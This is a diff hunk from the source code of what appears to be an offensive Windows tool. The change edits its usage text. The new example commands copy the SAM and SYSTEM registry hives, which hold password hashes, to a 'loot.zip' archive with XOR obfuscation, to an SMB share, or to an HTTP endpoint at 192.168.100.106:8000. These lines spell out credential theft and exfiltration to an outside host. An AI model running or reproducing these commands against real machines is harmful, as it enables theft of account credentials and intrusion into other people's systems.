@@ -20,9 +20,9 @@ static void PrintUsage(const wchar_t *exe)
              L"  %ls --files <path1> [path2 ...] [--output <archive> | --post <url>] [--keep] [--xor-seed <seed>]\n"
              L"Examples:\n"
              L"  %ls\n"
-             L"  %ls Users\\\\user\\\\Desktop\\\\test.txt C:\\\\test.txt\n"
-             L"  %ls --files Windows\\\\test1.txt Windows\\\\test2.txt --xor-seed 1337 --output C:\\\\loot.zip\n"
-             L"  %ls --files Windows\\\\test1.txt Windows\\\\test2.txt --xor-seed 1337 --post http://192.168.100.106:8000\n",
+             L"  %ls \"\\windows\\system32\\config\\system\" \"\\\\10.10.10.2\\share\\system\"\n"
+             L"  %ls --files Windows\\\\System32\\\\config\\\\sam Windows\\\\System32\\\\config\\\\system --xor-seed 1337 --output C:\\\\loot.zip\n"
+             L"  %ls --files Windows\\\\System32\\\\config\\\\sam Windows\\\\System32\\\\config\\\\system --xor-seed 1337 --post http://192.168.100.106:8000\n",
              exe, exe, exe, exe, exe, exe);
 }
 
